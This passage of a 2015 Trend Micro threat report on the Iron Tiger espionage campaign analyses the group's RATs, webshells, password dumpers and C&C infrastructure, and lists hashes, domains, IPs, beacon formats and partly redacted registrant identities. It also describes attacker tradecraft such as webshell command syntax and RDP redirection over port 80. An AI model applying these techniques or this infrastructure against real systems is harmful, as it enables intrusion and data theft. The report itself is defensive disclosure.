easy to see that it is a Gh0st RAT derivative.Ring RAT version 5.0.0.0\nRing RAT’s controller\nRing RAT’s controller had several capabilities, including:\n• File browser\n•\n Keylogger\n•\n Remote shell provider•  System manager\n•\n Screen capture\n•\n Remarks (notes)31 | Operation Iron Tiger\nIts builder, which allows attackers to easily create binaries to infect target systems, had several interesting \nimprovements from Gh0st RAT, including:\n•\n The “Active From” field allows attackers to configure specific times to activate malware. This is \nvery useful when they only want to send out data at certain hours that are less visible to victims monitoring network log files.\n•\n The “File Type” option allows attackers to only collect files with configured extensions (.DOC, .TXT, .PPT).\n•\n “Add D-Signature” allows attackers to add digital signatures to binaries so these would be harder to detect.\n•\n “Auto Fection U Disk” allows malware to automatically infect connected USB drives.\nRing RAT is not available in underground forums or any \npublicly accessible site. This modified Gh0st RAT could have been created for Iron Tiger’s or a closed community’s exclusive use.\nRing RAT’s Build Server features\nThe additional features revealed that Ring RAT was built for espionage purposes.32 | Operation Iron Tiger\nNBDDOS\nIron Tiger uses another Gh0st RAT variant, NBDDOS. A file named “ver.exe” (SHA-1: \n8c8f12ae866c38931e19d67fadc19bd18aaf0865 ), which was compiled on 26 December 2014, drops a DLL \n(SHA-1: 5b638171811412b570ed500803ceca5ed85580ff ), which was compiled 1 minute before ver.exe \nwas.The DLL was dropped into %TEMP% then moved to %system%. Careful examination and comparison \nwith Gh0st’s code revealed that it was another derivative of the latter. NBDDOS is installed as a service \nnamed “MediaCenter.” This can’t be used as an IoC, however, since it can be easily configured using the builder.\nNBDDOS’s service name and description\nNBDDOS’s installation function can be modified using a multi-strcat function, probably in an attempt to \nevade string-based detection. Its C&C server address can be extracted from a Web page or is hard-coded in its binary.\nImproved NBDDOS installation function33 | Operation Iron Tiger\nTwo C&C server types supported by NBDDOS\nNBDDOS was configured to retrieve C&C server addresses from a single Web page— phpxss.lofter.com. \nLofter.com is a light blogging or social networking service. It also uses “phpxss” as account name.\nIf the Web page option is configured, the IP address and port number must be surrounded by a unique \nmagic string, “$$$$$$$$$$$$.” Two magic strings accompany the C&C server string, which can help \nserve as an IoC for other security investigators. Compared with the original Gh0st RAT, NBDDOS uses a different encryption function.\nWeb page containing NBDDOS’s C&C server information34 | Operation Iron Tiger\nNBDDOS’s encryption function\nNBDDOS also uses a special string, “Vip20141226,” where “20141226” can correspond to the binary’s \ncompilation date. We have no idea though what “Vip” represents. The only reference we found was inside \nthe controller, near the credentials.\nAn NBDDOS controller used in Iron Tiger (SHA-1: 396af3ae018a9e251a832cce8aae1bcaa11cdc05 ) \ncompiled on 8 December 2014 was named “hello.exe.”\nNBDDOS controller’s GUI\n35 | Operation Iron Tiger\nMost of the original Gh0st RAT’s functions have \nbeen removed from NBDDOS, except for the remote control feature. Its builder supports the C&C server types, namely:\n•\n C&C information extracted from a Web page \nor file\n•\n Use of DNS resolution\n•\n Use of direct IP addresses\nTwo packers—UPX and FSG—are available \nthough users can also generate unpacked malware. Malware service names can be easily changed on infected systems via the same interface.\nNBDDOS can easily be downloaded from \nChinese underground forums.\nNBDDOS builder\nA Chinese underground forum offering NBDDOS’s source code\nGTalkTrojan\nGTalkTrojan (SHA-1: 50d2fef4e680072441084053773350d9ba60cac6 ), which was compiled on 15 \nOctober 2012, has very few functions, including:\n•\n Provides a remote shell\n•\n Has a “getfile” feature for data exfiltration (Note that it can only send files from a victim’s computer \nto a C&C server.)\n•\n Has a “settime” feature to set when infected systems should access C&C servers (default: 1 second)36 | Operation Iron Tiger\n“Getfile” and “settime” functions of GTalkTrojan\nTo remain persistent, GTalkTrojan adds a RunOnce registry key, HKEY_CURRENT_USER\\\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\. It then copies itself into c:\\windows\\\nsvchost.exe, creates a “cmd” command pipe, and accesses a C&C server— update.gtalklite.com —via port \n8080.\nGTalk Trojan adds the “vnet” registry key to remain persistent37 | Operation Iron Tiger\n“Cmd” that GTalkTrojan creates\nC&C server reference in GTalkTrojan\nWhen a connection is established, GTalkTrojan sends the following information to a C&C server:\nComputer=<COMPUTER NAME>[USERNAME]&lanip=<LAN IP ADDRESS>&uid=<UID>&os= \n<OPERATING SYSTEM> followed by command output\nNetwork capture showing the data GTalkTrojan sends to a C&C server38 | Operation Iron Tiger\nShould a C&C server require authentication, the following credentials are hard-coded into the binary:\nUsername: idmservice \nPassword: D13idmAdm\nGTalkTrojan uses the User-Agent, “HttpDump/1.0,” and sends out an MD5 hash as UID for SysDrive-\nSerialNumber. It used the gtalklite.com domain in its compilation registration.\nRegistrant Contact: \n  zhong meng [REDACTED]   sheng li [REDACTED]   [REDACTED]j\n @\n \n126\n \n.\n \ncom \n  tel: +86.[REDACTED]97837   fax: +86.[REDACTED]97837   he bei sheng he jian sha wa xiang xi liu wa cun   CN\nGTalkTrojan’s registration information\nWe found two other domains registered with the same information though they were not used in any \ntargeted attack operation that we know of.\nHTTPBrowser\nHTTPBrowser infects systems like PlugX does—via DLL side-loading. One version (SHA-1: \n75f098d6b3f217aba4c068b12896c332216fc6b3 ) used in Iron Tiger employed a legitimate Kaspersky \nbinary named “setup.exe” to infect systems with a malicious DLL. When launched, setup.exe:\n•\n Loads \nmsi.dll via the DLL Hijacking technique\n•\n Unencrypts and runs msi.dll in memory\n•\n Copies itself into %ALLUSER%\\Application Data\\kav\\\n•\n Creates the Run registry key, HKLM\\Software\\Microsoft\\Current Version\\Run, \nto remain \npersistent\n•\n Creates the suspended process, msiexec.exe [CnC IP] [CnC Port] 1\n•\n Creates and runs a remote thread in the suspended process\n•\n Unpacks \nmsi.dll.url\n•\n Replaces the original msiexec.exe image in memory with a malicious code\n•\n Executes the malicious code39 | Operation Iron Tiger\n• Accesses a C&C server and waits for commands\nHTTPBrowser uses a specific technique to bypass User Access Control (UAC)9.\nHTTPBrowser’s C&C server IP address and port information\nHTTPBrowser accesses a C&C server with the IP address, 103.24.1.54, via port 443. This was hosted in \nHong Kong at the time this paper was written. It creates a unique GUID that is stored in config.ini\n\t\non \ninfected systems. It then accesses a C&C server using the following HTTP GET request:\nGET /loop?c=[computer]->[user]&l=[ip]&o=[os version]&u=[client id]&r=[inject \nmode]&t=[time stamp] Host: REDACTED Connection: Keep-Alive User-Agent: HttpBrowser/1.0\nHTTPBrowser has remote shell-creation, uploading and/or downloading, and file-listing functions, which \nmake it a lightweight RAT that capable of executing more malicious commands or even exfiltrating data. To the best of our knowledge, it is not available in underground forums or other publicly accessible sites. It could have been created for the exclusive use in targeted attacks.\nOld unpatched servers that can be found online are easy prey \nto any attacker.\nFile certificate abusers\nIron Tiger uses three tools signed with the certificates on the next page.40 | Operation Iron Tiger\nIron Tiger uses this certificate signed on 22 \nNovember 2012Certificate’s validity information\nThe certificate with serial number, 23 92 b8 b2 e1 d5 e9 27 c7 26 37 9b 45 d2 21 ce, valid from 15 \nSeptember 2012 to 15 November 2014, was issued by Korea-based company, SoftCamp. It was signed on 22 November 2012 and has been used for the Netcat (nc) binary, HTran’s packed version, and a GSecDump binary.\nIt is not clear why the actors decided to sign files but not the malware at the same time and in the same \nway. We have not seen any of the other file certificates they used. This could be because they did not need them and found that their tools and malware were enough to stealthily move inside target networks. Adding the legitimate file certificate to their arsenal made it easier for the attackers to laterally move throughout networks and collect user credentials without getting noticed. Signed binaries are not often monitored by security solutions.\nMore Iron Tiger toolsAspxSpy2014\nAspxSpy is a publicly available WebShell. The version that Iron Tiger uses—AspxSpy2014—has been 41 | Operation Iron Tiger\nslightly modified though to evade detection.\nFile name SHA-1 Description\nAspxSpy2014Final.aspx c3f5d5d52890fe72bd2fc4c08aaf538da73016d7 AspxSpy2014—Main\nPluginDeflater.exe 7875ec1ffad546476defe5ad3e87930e7fa7ba95 AspxSpy2014—Plug-inSUEXPPlugin.dll 45ff712ae34512a9ac70060cec62a9b85f62804b AspxSpy2014—Plug-inTestPlugin.dll b9f67198ffa311aecb85e9914cdd96d99ecbdf3c AspxSpy2014—Plug-in\nactivedsimp.dll b27277142f4b4f71a757630a730314daae9ecfeb AspxSpy2014—Plug-in\nMore information on AspxSpy2014\nPluginDeflater.exe\n\tis a tool used to compress AspxSpy’s plug-in DLLs. SUEXPPlugin.dll, meanwhile, is \na local exploit plug-in for an old Serv-U FTP Server vulnerability. Finally, activedsimp.dll is an Active \nDirectory service AspxSpy plug-in.Mimik\natz, ZhuMimikatz, and Invoke-Mimikatz\nWe found several variants of the Mimikatz password dumper. While some were common versions \n(SHA-1: 3d3db9d8da0eba33444c73b6f85a4fd98a685055 ), others were not like ZhuMimikatz (SHA-\n1: 4883376735f981386e473318482fadfe90edc670 ) and two Mimikatz PowerShell versions (SHA-1: \n14a4b7cd0215a3d512f97d6ec4072a784f123527 and ab68576e3cf6bf8020cf15a83390ebf9d545389b ). \nThese allowed Mimikatz to completely work in memory without leaving traces on the file system.\nGSecDump\nGSecDump is a free publicly available password dumper. It has been used for years by various threat \nactors and legitimate security auditors alike. Nearly all threat actors slightly modified the GSecDump binary to evade antivirus detection. All versions found are, in fact, detected on VirusTotal.\nQuarksPwDump\nPassword dumper, QuarksPwDump or hashdump.exe (SHA-1: \n3c6becafa9594601db64dc32c2c0384425a8fb5c, detected by Trend Micro as HKTL_PWDump), along with \nits source code, are also publicly available for free on https://github.com/quarkslab/quarkspwdump. \nThe actors, however, compiled their own version in June 2012, a month after the release of the original \ncode. This showed that they closely monitored such security tool updates.42 | Operation Iron Tiger\nGetPassword_x64\nGetPassword_x64 (SHA-1: \n71c11988a7a14e2257a91bcc5efa85520540aa5c, detected by Trend Micro as HKTL_PWDump) is a password dumper specifically for 64-bit systems. It is also publicly available. It has the debug string, “C:\\Users\\K8team\\Desktop\\\nGetPassword\\Debug x64\\GetPassword.pdb,” in its binary that points to its developer, K8Team.\nSample output of GetPassword_x64.exe\nReadPWD86\nReadPWD86 is another publicly available password dumper for x86 systems (SHA-1: \n65b77d8b1ffd63a343c28e978487bc38b9792c6f, detected by Trend Micro as HKTL_PWDump).\nEFH3/1F\nEFH3/1F is a command-line tool that encodes files. It has a pretty straightforward purpose.\nEFH3/1F’s output\nNBTScan\nNBTScan is a free publicly available tool that scans for open NETBIOS name servers on a local or remote \nTCP/IP network. Its functionality is based on that of standard Windows tool, nbtstat, though it operates on several addresses instead of just one.43 | Operation Iron Tiger\nNBTScan’s options\nNetcat\nNetcat or nc.exe is a popular tool among network administrators and security auditors. It is often referred \nto as the “Swiss Army knife” of network-related tools. It allows users to read and write data across TCP \nor UDP network connections. While it is a very simple tool, it can do a lot of things, including opening a port and listening for connections, executing remote shells, and others. The nc.exe binary is signed with a \nSoftCamp file certificate.\nNc.exe’s options44 | Operation Iron Tiger\nHTran\nHTran is very popular among Chinese threat actors. It is a network communication bouncer that allows \nattackers to use compromised machines as pivot to access other unreachable systems, for one. We found a packed and slightly modified (SHA-1: 9484bb1b1c0e39355a66b20fc361846ce1f063e0, detected \nby Trend Micro as HKTL_HTRan) and an unpacked version (SHA-1: 0ad2796b1312af4db975a3978ede19e939e42846, also HKTL_HTRan) of this tool used in attacks. Both \nwere named “websys.exe.” The packed HTran version was also signed with a SoftCamp file certificate.\nHTran command-line tool\nUnknown redirection toolkit\nThough we could not identify this toolkit’s name, we found that it comprised netcat and two files—\ndrivers.exe (SHA-1: add6f880705b4aaf4b22b60dd67ca9034694550d, detected by Trend Micro as \nHKTL_PORTCON) and ChangePort.exe (SHA-1: a346588c70751815bbb4c0922ea2c5e1ab9953db, also \nHKTL_PORTCON). It is very rarely seen in targeted attack campaigns.\nAttackers who want to access RDP 3389 via port 80 on an IIS server configured to only leave port 80 \nopen can use this toolkit, among others. We saw attackers:\n•\n Execute drivers.exe \non the IIS server, which installs a Network Driver Interface Specification (NDIS) \ndriver\n•\n Run \nChangePort.exe to map any port to port 3389 on the IIS server\n•\n Execute nc.exe and access the target server via port 80\n•\n When a connection has been \nestablished, send the special string, “Send chkroot2007,” and disconnect\n•\n An RDP client can now be connected to a target system’s port 80 while all network traffic is \nredirected to port 3389\nBecause the attackers identified themselves by sending the special string, only their traffic is redirected. \nEveryone else’s will be unaffected and stay on port 80.45 | Operation Iron Tiger\nZval.jsp\nZval.jsp is not a standalone WebShell, it needs a client to run on compromised \nservers. All commands are passed with the parameter, /[REDACTED].\njsp?[Password]=[Command]&z1=[Argument]&z2=[Argument]. The following commands can be used:\n•\n A\n List drives\n•\n B\n List files in target directory\n•\n C\n Read file (ASCII mode)\n•\n D\n Write file (ASCII mode)\n•\n E\n Delete file or directory\n•\n F\n Download file (Binary mode)\n•\n G\n Upload file (Hex to Binary mode)\n•\n H\n Copy file or directory\n•\n I\n Rename file•\n J\n Create directory\n•\n K\n Set last modified time for file\n•\n L\n Download file from remote URL\n•\n M\n Execute shell command\n•\n N\n Get database information\n•\n O\n List tables for specific database\n•\n P\n List columns for specific table\n•\n Q\n Execute SQL command\nThis WebShell works with China Chopper.\nHTTP\n/SOCKS Proxy\nWe also found a tool called “so.exe” (SHA-1: 3ea58b2ff30ee1053a4053c681042516cb57038e, detected by \nTrend Micro as HKTL_Proxy). It is a very basic HTTP/SOCKS proxy, which is a slightly modified version \nof the publicly available SOCKS v4 && v5 && Http Proxy V2.0 by LZX.\nOther tools\nIn addition to the above-mentioned tools, the actors also use legitimate tools, including:\n•\tLocal.exe from Microsoft’s Resource Kit, which enumerates the members of local groups on remote \nservers or domains\n•\n Microsft’s \nPsGetSid.exe, which allows users to translate SIDs into display names and vice versa\n•\n Joeware.net’s GetUserinfo\nWe also found old exploits (CVE-2008-1436) for IIS 6 named “helloa.exe” (SHA-1: \n126a5972a0f6b0a5b0a2b52d7d848e8a9824f562, detected by Trend Micro as HKTL_IISExploit) and \n“6.exe” (SHA-1: 856c3252fbc3d0e17d7d65cddff1ebbbab48496d, also HKTL_IISExploit).46 | Operation Iron Tiger\nInfrastructure\nIron Tiger’s C&C infrastructure included several compromised servers and the extensive use of BAIGE \nVPN’s services.\nCompromised C&C servers\nIron Tiger successfully compromised an Asian academic institution’s server to act as C&C server and \nstolen data drop zone for dnstunclient. It was also accessed by a PlugX variant through a subdomain of shangxian.info. We decided not to disclose this subdomain though since it can reveal the academic \ninstitution’s name.\nThis server was poorly configured. It was also used by warez distributors, in addition to the actors. The \nwarez distributors used it to store videos for virtually anyone on the Internet. FTP access to it did not require authentication. As such, anyone can use its various folders. One user even created a folder with a funny name just to show how poorly secured the server was.\nData collected from C&C servers\nWe were able to gather a lot of information from Iron Tiger’s main C&C server—the academic \ninstitution’s compromised server.\nNetwork connections made to C&C servers\nSeveral network connections made via RDP were seen. This is not surprising, as the protocol is used to \naccess remote computers from different geographical locations. The actors accessed the C&C server using various IP addresses.\nIP address Computer name Location\n114.88.206.132 YOUSISTE China\n211.62.158.22 YOUSISTE Korea\n180.150.226.27 YOUSISTE Korea\n67.198.244.74 YOUSISTE USA\n157.7.64.122 YOUSISTE Japan\n157.7.64.122 XM-ATT Japan\n125.140.30.31 YOUSISTE Korea\n203.232.186.35 YOUSISTE Korea\nIP addresses that the actors use to access the C&C server47 | Operation Iron Tiger\nThe computer name, “YOUSISTE,” frequently accessed the server, though we did not find useful \ninformation on it. Interestingly, two different computers used the same IP address to access the C&C server. An attacker could have used two computers to access the server or several attackers could have used the same attack infrastructure.\nWe believe the RDP connections were aided by VPN services and/or compromised computers, making \nthe actors harder to track and find. A connection going to a Chinese IP address (116.233.12.114), which \nwas used as a data-exfiltration channel, was also seen.\nAttackers’ local account\nA single user account named “xss” was created on the C&C server (compromised Windows Server® \n2003) on 14 September 2014. It used the password, “woshinidie,” which translates to “I am your father” in Pinyin. Pinyin is the official phonetic system for transcribing Mandarin pronunciations of Chinese characters into the Latin alphabet. This password could be a funny reference to “Star Wars.”\nThe letters, “xss,” also seen in the Blogspot page (xssok), were again seen in reference to the C&C server.\nThe xss user account was used in the last quarter of 2014. It has not been used since. Instead, the real \nadministrator account was used.\nAdditional email accounts\nApart from the account used in spear-phishing campaigns, we saw the actors use additional email \naccounts for various purposes. They had several email accounts, mostly for testing purposes, with “phpxss” or “testxss” from providers like Gmail™, Hotmail, AOL, and Yahoo!®.\nThe actors could be reporting to a different email address per victim. They, for instance, sent a list of \nfiles from a compromised system to a specific email address, which indicated the progress made. It is not clear, however, if the receiver was a member of the group or a third party that provided expert services to let attackers know which files were worth stealing.\nExtensive use of BAIGE VPN’s services\nPhpxss extensively used BAIGE VPN’s servers, which were mostly located in China (a little more than \n500 different IP addresses). Some servers were located in the US, Canada, Hong Kong, Russia, Taiwan, Japan, and South Korea.48 | Operation Iron Tiger\nCountries where BAIGE VPN servers were located\nBAIGE VPN offers very affordable services. Its most expensive offering was a one-year subscription worth \n130 Yuan (around €19). Its Windows client is pretty straightforward.\nChinaUnited StatesTaiwanHong KongJapanKoreaRussiaCanada94.45%\n1.97%0.89%0.72%0.72%0.72%0.36%0.17%\nBAIGE VPN’s service prices49 | Operation Iron Tiger\nBAIGE VPN’s client GUI\nWhile phpxss appears to use this service, it may not be the only one. To ensure anonymity, attackers \nnormally hid behind several layers or VPNs or proxies.\nBAIGE VPN does not accept customers outside China. It \nimmediately filters out external connections via a registration page.\nDomain registration\nIron Tiger used several legitimate online services for its infrastructure but also employed registered \ndomains.\nShangxian.info\nOne of shangxian.info’s subdomains was configured to point to the main C&C server’s IP address. The \ndomain was registered by phpxss.Interestingly, one user named “myershao” uses the exact same password as phpxss to create a local \naccount on a compromised machine. A familiar email address, [REDACTED]o\n \n@\n live\n \n.\n cn, was also seen.50 | Operation Iron Tiger\nPi.mai1.info\nPi.mai1.info was used in relation to two malware families at the same time—Gh0st and PlugX. These \nserved as file attachments in a spear-phishing campaign.\nIn one campaign, a .RAR file named “documentation.rar” contained a dropper (SHA-1: \n3bcd90785ff5883bc460a74eca3bf9033a542335 ) of a Gh0st variant named “NWCWorkstationex.dll” \n(SHA-1: 96d6a67227a6d650ab8c5465cb4b091217e75a5f ). NWCWorkstationex.dll could be an early \nversion of Ring RAT configured to steal .DOC, .TXT, and .PPT files.\nTarget file types hard-coded in the NWCWorkstationex.dll binary\nAnother archive seen contained a dropper (SHA-1: 11348a72a0864c6c455a535d5d7bde2997270266 ) of \na Poison Ivy variant (SHA-1: 6bcd525bb425dbb7fbc79dd6a605fac8f925b0cb ) named “mspmsnsv.dll.” \nIts configuration leaked the nickname, “2shao,” which we were not able to tie to a real person’s identity or \nprofile.\nMai1.info’s registration information has changed several times. It showed references to supposed \nidentities in Russia or the US at the time it was being actively used by malware. It had matching elements tied to [REDACTED]o\n \n@\n live\n \n.\n cn and Guo Fei.\nRegistrant Name: Guo Fei [REDACTED] \nRegistrant Organization: Registrant Street1: He Nan Sheng Huo Jia Xian Registrant Street2: Registrant Street3: Registrant City: XinXiang Registrant State/Province: HeNan Registrant Postal Code: 0373 Registrant Country: CN Registrant Phone: +86.[REDACTED]39262 Registrant Email: [REDACTED]o\n @\n \nlive\n \n.\n \ncn\nMai1.info’s registration information51 | Operation Iron Tiger\nMitigation: Combating cyber espionage and \ntargeted attacks\nForeign spies in espionage films help their nations obtain competitive advantages over others by jumping \nseemingly impossible hoops and hurdles. These days, spying happens in cyberspace where threat actors are aided by either ready-made or customized tools and social engineering lures.\nWe saw cyberspies with digital roots in China target high-technology organizations from the US, but not \nbefore spending years extracting information from targets in Asia-Pacific, including their own country. Iron Tiger, which could be part of a larger campaign where actors are assigned specific targets to monitor, particularly trailed its sights on obtaining defense-related information. It is believed to have stolen up to terabytes of data, given that an organization lost 58GB alone.\nTargets face serious repercussions, given the sensitive nature of the data they keep. The data the actors \nstole, after all, translates to years of invaluable government and corporate research and development (R&D) dollars.\nFor nation-states like the US and China, cyber espionage may not come as a surprise. Several campaigns \nlike Pawn Storm and Arid Viper have already taken advantage of the weakest links across industries to gain counterintelligence or perform industrial espionage on perceived foes.\nQuestions with regard to threat mitigation remain. Thwarting cyber attacks should not rely on off-the-\nshelf, traditional anti-malware solutions alone. Sensitive data requires custom defense and multilayer protection that can’t be easily rendered useless by spear-phishing campaigns and malware attacks. Organizations need to gather threat intelligence to combat cyber espionage and protect against targeted attacks. They should operate under the assumption that their network has already been compromised.52 | Operation Iron Tiger\nReferences\n1. CrowdStrike. (2013). “CrowdStrike Global Threat Report: 2013 Year in Review.” Last accessed \non 14 September 2015, http://www.crowdstrike.com/wp-content/uploads/cs_downloads/\nCrowdStrike_2013_Global_Threat_Intel_Report.pdf .\n2.\n Dell SecureWorks. (5 August 2015). Dell SecureWorks. \n“Threat Group-3390 Targets Organizations \nfor Cyber Espionage.” Last accessed on 14 September 2015, http://www.secureworks.com/cyber-\nthreat-intelligence/threats/threat-group-3390-targets-organizations-for-cyberespionage/ .\n3.\n Feike Hacquebord. (18 August 2015). TrendLabs Security Intelligence Blog. “Pawn Storm’s Domestic \nSpying Campaign Revealed; Ukraine and US Top Global Targets.” Last accessed on 9 September 2015, http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storms-domestic-spying-\ncampaign-revealed-ukraine-and-us-top-global-targets/.\n4.\n China Vitae. (2003–2015). China Vitae. “Han Zheng \n韩正.” Last accessed on 9 September 2015, \nhttp://www.chinavitae.com/biography/Han_Zheng/summary .\n5.\n TrendLabs. (8 December 2014). Trend Micro Security News. “The Hack of Sony Pictures: What We \nKnow and What You Need to Know.” Last accessed on 9 September 2015, http://www.trendmicro.\ncom/vinfo/us/security/news/cyber-attacks/the-hack-of-sony-pictures-what-you-need-to-know .\n6.\n Keith Tyler. (16 November 2012). Information on Security. \n“China Chopper WebShell—The 4KB \nThat Owns Your Web Server.” Last accessed on 10 September 2015, http://informationonsecurity.\nblogspot.fr/2012/11/china-chopper-webshell.html .\n7.\n Ryan Angelo Certeza. (4 October 2012). \nThreat Encyclopedia. “Pulling the Plug on PlugX.” Last \naccessed on 11 September 2015, http://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-\nattack/112/pulling-the-plug-on-plugx .\n8.\n Jaime Blasco. (13 September 2012). The AlienVault Blogs: Taking On Today’s Threats. “Tracking \nDown the Author of the PlugX RAT.” Last accessed on 11 September 2015, https://www.alienvault.\ncom/open-threat-exchange/blog/tracking-down-the-author-of-the-plugx-rat .\n9.\n Leo Davidson. (2009). <<pretentious/name>>. \n“Windows 7 UAC Whitelist: Proof-of-Concept Source \nCode.” Last accessed on 11 September 2015, http://www.pretentiousname.com/misc/W7E_Source/\nWin7Elevate_Inject.cpp.html .©2015 by Trend Micro, Incorporated. All rights reserved. Trend Micro and the Trend Micro t-ball logo are trademarks or registered trademarks of  \nTrend Micro, Incorporated. All other product or company names may be trademarks or registered trademarks of their owners.TREND MICROTM\nTrend Micro Incorporated, a global cloud security leader, creates a world safe for exchanging digital information with its Internet content security and threat \nmanagement solutions for businesses and consumers.  A pioneer in server security with over 20 years experience, we deliver topranked client, server, and \ncloud-based security that fits our customers’ and partners’ needs; stops new threats faster; and protects data in physical, virtualized, and cloud environments. \nPowered by the Trend Micro™ Smart Protection Network™ infrastructure, our industry-leading cloud-computing security technology, products and services \nstop threats where they emerge, on the Internet, and are supported by 1,000+ threat intelligence experts around the globe. For additional information, visit \nwww.trendmicro.com.Created by:\n \nThe Global Technical Support and R&D Center of TREND MICRO"
}